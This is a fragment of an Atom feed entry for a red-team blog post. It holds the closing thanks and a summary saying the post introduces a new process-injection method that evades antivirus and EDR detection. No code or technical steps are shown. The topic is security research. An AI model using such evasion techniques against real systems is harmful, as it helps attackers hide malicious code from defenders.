&lt;p&gt;It was fun to mess around with the threads and to overcome the many hurdles that got in the way, especially after seeing the injector working as intended. This shows that you can always find new ways to achieve what you want, all you have to do is think out of the box a little once in a while. I want to give many thanks to my colleague Rick Veldhoven for helping me out when things got tough.&lt;/p&gt;</content><author><name>Boudewijn Meijer</name><email>bcm.meijer@gmail.com</email></author><summary type="html">Summary One of the many tricks in the red-teamer’s arsenal is process injection. This technique is leveraged to get code to run in the address space of another process. There are multiple reasons as to why this would be desirable when attacking a computer or network. Among other things it can be used to bypass whitelisting, evade detection and increase stealthiness. This technique, however, is widely used and therefore widely known. Most of the decent antivirus and EDR-solutions have detection rules in place to stop injection from taking place. This post will introduce a new way of reaching succesful injection without it getting detected or stopped.</summary></entry></feed>